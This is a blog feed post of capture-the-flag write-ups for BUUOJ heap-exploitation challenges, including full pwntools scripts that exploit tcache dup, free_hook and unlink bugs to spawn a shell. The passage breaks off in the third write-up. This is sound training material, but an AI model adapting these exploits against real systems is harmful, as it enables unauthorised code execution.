{
    "version": "https://jsonfeed.org/version/1",
    "title": "Walt's Blog • All posts by \"tcache\" tag",
    "description": "",
    "home_page_url": "http://waltcsz.github.io",
    "items": [
        {
            "id": "http://waltcsz.github.io/2023/11/buu-1117/",
            "url": "http://waltcsz.github.io/2023/11/buu-1117/",
            "title": "buu_1117",
            "date_published": "2023-11-17T12:40:02.000Z",
            "content_html": "<h1 id=\"actf_2019_babyheap\"><a class=\"markdownIt-Anchor\" href=\"#actf_2019_babyheap\">#</a> actf_2019_babyheap</h1>\n<p>tcache dup</p>\n<p>libc-2.27_0ubuntu1_amd64</p>\n<p>这道题除了地址随机，其他保护都开了。有 tcache dup 漏洞。</p>\n<p>经典的使用块去管理用户块。管理块先存放用户块地址，然后存放输出函数地址。</p>\n<p>释放块后形成块链，由于 tcache 只会清空 8 字节存放 fd，所以输出函数地址不会被清除。利用这点输出 tcache bin 链上某个块的地址，实现堆地址泄露。</p>\n<p>构造 管理块 -&gt; 管理块，在后者中输入块地址和 system 函数地址。输入的地址对应的块为存放 <code>&quot;/bin/sh\\0&quot;</code>  字符串的块。</p>\n<blockquote>\n<p>每次输出菜单后都会调用 system，产生内核用户互换，导致调试中断。所以只能该调式的地方都加行 <code>gdb.attach()</code> 。</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ACTF_2019_babyheap'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27387</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x400D69'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input size: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input content: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input list index: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    dbg<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input list index: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sys_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># get add: r0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content is \\''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'addr: %#x'</span><span class=\"token operator\">%</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>dbg<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># 20 20 20 40</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">+</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># write in h0</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_2019_es_1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_es_1\">#</a> ciscn_2019_es_1</h1>\n<p>** 考点：**heap, tcache dup, free_hook</p>\n<p>**libc 版本：**ibc6_2.27-3ubuntu1_amd64</p>\n<p>块管理块。释放只释放用户块。释放后地址不清空。</p>\n<p>分配超过 0x400 大小的块然后释放，再打印，泄露 libc 地址。</p>\n<p>tcache dup 对 free_hook 进行读写，将其修改为 system 的地址。最后释放含 <code>&quot;/bin/sh\\0&quot;</code>  字符串的块。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ciscn_2019_es_1'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28322</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x1621)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span>  content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b's name'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input name:\\n'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'compary call:\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'head 0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'head 1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'head 2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>r0u <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>ma_ <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mh_a <span class=\"token operator\">=</span> ma_ <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span> mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>fh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'head 3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>fh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'h4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'getshell!'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'h5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'h6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"axb_2019_heap\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_heap\">#</a> axb_2019_heap</h1>\n<p>** 考点：**fmtstr, unlink, off_by_one</p>\n<p>**libc 版本：**libc6_2.23</p>\n<p>该程序开启了全保护，一开始有个 printf 的格式化字符串漏洞。</p>\n<p>分配函数略显复杂。分配时，若 key 变量值不为 43，那么将不能分配大小小于 0x80，即属于 fastbin 范围的块。之后有个分配后地址合法性校验，分配得到的地址不能过于接近储存块地址的数组。</p>\n<p>含有编辑函数。释放函数清空了指针。</p>\n<p>对块进行读写的函数 <code>get_input</code>  存在 off by one 漏洞。当已输入字符数等于大于给定值 + 1 后才退出。</p>\n<p><img data-src=\"./image-20231118194147647.png\" alt=\"image-20231118194147647\"></p>\n<h2 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用</h2>\n<p>一开始的格式化字符串漏洞只能利用一次，因此只能利用其泄露地址。泄露代码段地址可以推测.bss 段地址，由此计算出 notelist 真实地址。泄露 libc 地址用于获取 system 函数地址。拿到数组地址后可以利用 unlink，由此实现任意地址读写，将 free_hook 填入 system 地址，后面的懂的都懂。</p>\n<blockquote>\n<p>若一开始格式化字符串使用的输入函数是 read，那么可以利用低字节覆盖，将 main 函数地址覆盖为 key 变量的地址，然后利用 % n 修改 key 为 43。但第三字节需要爆破。</p>\n<p>若没有 canary 保护，且 read 函数输入，则可以溢出覆盖返回地址低位，再次利用格式化字符串漏洞。</p>\n</blockquote>\n<p>这题有个很坑的点。分配函数内有个 check_pass 函数验证分配地址合法性。由于 unlink 后，p 和 p 储存的内容只有 0x18 的差距，必定无法通过验证，所以一开始我以为必定用不成 unlink。但是！都 unlink 任意地址读写了，为啥还会需要再去分配 fake chunk 之类的呢？而编辑函数内没有该检测，所以 unlink 利用没有收到任何影响。这次属于是被出题者骗到了。</p>\n<figure 